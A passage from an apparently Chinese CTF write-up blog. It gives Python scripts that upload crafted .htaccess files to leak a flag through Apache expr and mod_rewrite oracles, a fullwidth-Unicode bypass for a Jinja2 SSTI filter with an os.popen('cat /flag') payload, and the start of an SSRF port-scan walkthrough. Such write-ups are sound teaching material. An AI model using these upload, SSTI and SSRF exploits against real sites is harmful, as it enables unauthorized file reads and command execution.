字符集 (Flag 常见字符)</span></span><br><span class="line"><span class="comment"># 注意：如果 Flag 包含特殊正则字符（如 . * + ?），可能需要转义，但大括号 &#123;&#125; 在这里通常没事</span></span><br><span class="line">charset = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;_-!@%&quot;</span></span><br><span class="line"><span class="comment"># ===========================================</span></span><br><span class="line"></span><br><span class="line">upload_url = base_url</span><br><span class="line">check_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/upload/<span class="subst">&#123;target_file_name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 目标文件检测 URL: <span class="subst">&#123;check_url&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 开始盲注... (这可能需要几分钟)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你已经知道 flag 以 UniCTF 开头，可以填在这里加速: current_flag = &quot;UniCTF&quot;</span></span><br><span class="line">current_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    found_this_round = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="comment"># 构造猜测的 Flag 前缀</span></span><br><span class="line">        guess = current_flag + char</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造 .htaccess 内容</span></span><br><span class="line">        <span class="comment"># 核心逻辑：</span></span><br><span class="line">        <span class="comment"># Require expr &quot;file(&#x27;/flag&#x27;) =~ /^猜测内容/&quot;</span></span><br><span class="line">        <span class="comment"># 如果 /flag 文件内容以 guess 开头 -&gt; 正则匹配成功 -&gt; 允许访问 (200)</span></span><br><span class="line">        <span class="comment"># 否则 -&gt; 拒绝访问 (403)</span></span><br><span class="line">        htaccess_payload = <span class="string">f&#x27;Require expr &quot;file(\&#x27;/flag\&#x27;) =~ /^<span class="subst">&#123;guess&#125;</span>/&quot;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess_payload, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 1. 上传 .htaccess (覆盖旧的配置)</span></span><br><span class="line">            <span class="comment"># print(f&quot;[-] Trying: &#123;guess&#125;&quot;) # 调试用</span></span><br><span class="line">            res_upload = requests.post(upload_url, headers=headers, files=files, timeout=<span class="number">5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> res_upload.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 上传 .htaccess 失败: <span class="subst">&#123;res_upload.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="comment"># 如果上传失败可能是频率限制，稍微停顿</span></span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 2. 访问目标文件检测状态 (Oracle)</span></span><br><span class="line">            res_check = requests.get(check_url, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> res_check.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="comment"># 状态码为 200，说明 Require expr 判定为真，猜测正确</span></span><br><span class="line">                current_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现一位: <span class="subst">&#123;current_flag&#125;</span>&quot;</span>)</span><br><span class="line">                found_this_round = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> res_check.status_code == <span class="number">403</span>:</span><br><span class="line">                <span class="comment"># 状态码为 403，说明 Require expr 判定为假，猜测错误</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> res_check.status_code == <span class="number">500</span>:</span><br><span class="line">                <span class="comment"># 500 通常是正则语法错误（比如猜到了特殊字符导致正则崩了）</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 500 错误 (可能是正则语法问题): <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span> </span><br><span class="line">                <span class="comment"># print(f&quot;[?] 未知状态码: &#123;res_check.status_code&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_this_round:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 本轮循环未找到任何字符。&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 当前已获取: <span class="subst">&#123;current_flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 可能原因：Flag 结束了，或者字符集不全。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_flag.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[SUCCESS] Flag 已获取完成！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; <span class="subst">&#123;current_flag&#125;</span> &lt;&lt;&lt;&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDIxZTJlOWY0NWExNDEzZTQ2MjcwZTllODhmMTI0ZDBfVTNEb28ycEkyMUhVZlRKYXBhTEpoZ25YTVF4V3RzNU9fVG9rZW46V0w4OWJiSlA5b29xVjR4d1NqcGNrbFFMbjBiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a>ezUpload Revenge!!</h3><p>多了点waf</p>
<p>利用 <code>mod_rewrite</code> 进行盲注</p>
<p>Apache 强大的重写模块 (<code>mod_rewrite</code>) 通常是默认开启的，且它支持 <code>expr</code> 表达式判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^UniCTF/&quot;</span><br><span class="line">RewriteRule ^ - [F]</span><br></pre></td></tr></table></figure>

<p><strong>开启重写引擎</strong>：<code>RewriteEngine On</code></p>
<p><strong>设置条件</strong>：利用 <code>RewriteCond expr &quot;...&quot;</code> 判断文件内容是否匹配正则。</p>
<p><strong>触发规则</strong>：如果条件满足，则执行 <code>RewriteRule</code> 强制返回 <strong>403 Forbidden</strong>。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= 配置区域 =================</span></span><br><span class="line"><span class="comment"># 题目主页 URL (根据实际情况修改)</span></span><br><span class="line">base_url = <span class="string">&quot;http://80-c91b0022-a098-4436-9547-0824c9d7334b.challenge.ctfplus.cn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用提前上传  任意文件名即可</span></span><br><span class="line">target_file_name = <span class="string">&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集</span></span><br><span class="line">charset = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;_-!@%&quot;</span></span><br><span class="line"><span class="comment"># ===========================================</span></span><br><span class="line"></span><br><span class="line">upload_url = base_url</span><br><span class="line">check_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/upload/<span class="subst">&#123;target_file_name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 目标 URL: <span class="subst">&#123;check_url&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 开始 Rewrite 盲注 (403=True, 200=False)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">current_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    found_this_round = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        guess = current_flag + char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造 .htaccess</span></span><br><span class="line">        <span class="comment"># 逻辑：如果 flag 匹配 guess，则 RewriteRule 触发 [F] (Forbidden)</span></span><br><span class="line">        <span class="comment"># 注意：因为 ban 了反斜杠 \，我们无法转义正则特殊字符。</span></span><br><span class="line">        <span class="comment"># 但在简单 Flag 盲注中，只要字符集不含 . * + ? 等正则元字符，通常可以直接拼接。</span></span><br><span class="line"></span><br><span class="line">        htaccess_payload = <span class="string">f&quot;&quot;&quot;RewriteEngine On</span></span><br><span class="line"><span class="string">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^<span class="subst">&#123;guess&#125;</span>/&quot;</span></span><br><span class="line"><span class="string">RewriteRule ^ - [F]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess_payload, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 1. 上传</span></span><br><span class="line">            res_upload = requests.post(upload_url, headers=headers, files=files, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> res_upload.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 上传失败: <span class="subst">&#123;res_upload.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 2. 检测</span></span><br><span class="line">            res_check = requests.get(check_url, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判定逻辑：</span></span><br><span class="line">            <span class="comment"># 403 -&gt; Rewrite 规则生效 -&gt; 条件为真 -&gt; 猜对了</span></span><br><span class="line">            <span class="comment"># 200 -&gt; Rewrite 规则未生效 -&gt; 条件为假 -&gt; 猜错了</span></span><br><span class="line">            <span class="keyword">if</span> res_check.status_code == <span class="number">403</span>:</span><br><span class="line">                current_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;current_flag&#125;</span>&quot;</span>)</span><br><span class="line">                found_this_round = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> res_check.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> res_check.status_code == <span class="number">500</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 500 Error (可能是 Rewrite 语法错误或关键字被禁): <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="comment"># 如果所有字符都报 500，说明 Rewrite 被禁了</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_this_round:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 本轮未找到字符。&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 最终 Flag: <span class="subst">&#123;current_flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_flag.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[SUCCESS] Flag: &quot;</span> + current_flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=Njg3ODljY2Y4MzUwMzQxMzUxYmY3MTk0ZDcwY2E4OGFfaGdWQkpZb0ZZTlMyZXhJZENadTBLSDRESm95RTZnczRfVG9rZW46RXVnYWJhdEJGbzZrYVh4WGhYcWNhWjJxbmVkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzAxNWUwNWFhM2UwODUyZTAwZDY2YWEyZjE5ZmY4ZmRfMVhqZk5JVDVxYTFtVTZuZnZFRzJRVjNrOTd2MXdSY2dfVG9rZW46VHJ2VmIzV0dyb3NYWWh4alhpMWN0UEZ5blhlXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>Supports typography cleanup (CJK-friendly). </p>
<p><code>/api/export</code> 接口   存在jinja2  ssti模板注入 严格过滤了 <code>&#123;&#123;`, `&#125;&#125;</code>, <code>os</code>, <code>import</code>, <code>flag</code> 等关键词。   <code>motto</code> 字段限制 160 字符</p>
<p><strong>NFKC 规范化 (Unicode Normalization)</strong>。</p>
<ul>
<li>源码提示 “typography cleanup (CJK-friendly)”。这意味着后端会将“全角字符”转换为“半角字符”。</li>
<li>WAF 只认识半角黑名单，不认识全角字符。</li>
</ul>
<p>exp： 半角字符转换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_fullwidth</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将标准 ASCII 字符转换为全角字符 (Fullwidth/Zenkaku)</span></span><br><span class="line"><span class="string">    用于绕过基于 ASCII 关键词的 WAF 检测</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        code = <span class="built_in">ord</span>(char)</span><br><span class="line">        <span class="comment"># 处理标准可见字符 (33-126)</span></span><br><span class="line">        <span class="comment"># 全角字符通常偏移量为 0xFEE0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0x21</span> &lt;= code &lt;= <span class="number">0x7E</span>:</span><br><span class="line">            res.append(<span class="built_in">chr</span>(code + <span class="number">0xFEE0</span>))</span><br><span class="line">        <span class="comment"># 处理空格 (32 -&gt; 12288)</span></span><br><span class="line">        <span class="keyword">elif</span> code == <span class="number">32</span>:</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="number">0x3000</span>))</span><br><span class="line">        <span class="comment"># 其他字符保持原样</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === 使用示例 ===</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123; 7*7 &#125;&#125;&quot;</span></span><br><span class="line">bypass_payload = to_fullwidth(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始 Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;绕过 Payload: <span class="subst">&#123;bypass_payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YmFmZGJmODBiZDllZDMyMGIwNTdhZGNmY2VmMjA5ZTFfZEx3Z2syVU5yTktoYzRFSUhZanRSeWZjeGFObGdmQjdfVG9rZW46RmtoUWJ3aVR4b3NEYjd4Vm5xcmMxa2I4bnFjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjYTNjMDJmM2E4MTcxNmY3YjllMTYwNDRhMGEzOWJfcGR1cTlWOXNrZGhoWkhuNFBnRDVWajU5MjBKZ2ZaWnVfVG9rZW46V3RObGJQY2pyb1VmSkF4VE5tM2NObXpYbnhkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line"></span><br><span class="line">｛｛　ｓｅｌｆ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿．＿＿ｂｕｉｌｔｉｎｓ＿＿．＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｐｏｐｅｎ（＇ｃａｔ　／ｆｌａｇ＇）．ｒｅａｄ（）　｝｝</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MmM2NmI0MjM4ZjBlMDJlNDg5Njg5ODk0ZjcxNTQ0NjVfWmlLeTdYZHJZV2JPaDNqV0Y5Z29GMWYweklucGl6aGpfVG9rZW46SkZoeGJCUkVPbzhzSnZ4bjhnRmNIVGpUblJnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h3><p>SSRF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MzU1NThiMmE5MTZkNzgxMDJjZDg3MzMyNzJhN2M0OWVfTHpiOTdBelFWMzV4YjNCYTdTS0xGZkM5ajY3M2ZLV3lfVG9rZW46TzhxcGJWRHFMb1czSWt4VzVBb2NWdlAybmpkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmJmOGU4OWViZGNjNjViZWRkNmJiM2YxY2NmZGFjYTZfd3c5NnZFbEI3Qmhqemg2VGh6YlRpQTAwTzNsOG9CODhfVG9rZW46TU1JVGI4MlQ3b1BXZXV4YUxNU2M5OTJNbjhiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>访问   &#x2F;openapi.json  发现暴露的 <code>/fetch</code> 接口。该接口接受 <code>url</code> 参数  即主界面的输入点</p>
<p>使用 <code>/fetch</code> 扫描端口  发现了</p>
<p>8001：返回 <code>x-service: admin_panel</code>，管理后台。</p>
<p>9000：返回 <code>websocket rejected</code>，WebSocket 服务。</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8001/openapi.json">http://127.0.0.1:8001/openapi.json</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x-service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;openapi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;/status&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Status Page&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;status_page_status_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;/api/debug/config&quot;</span><span 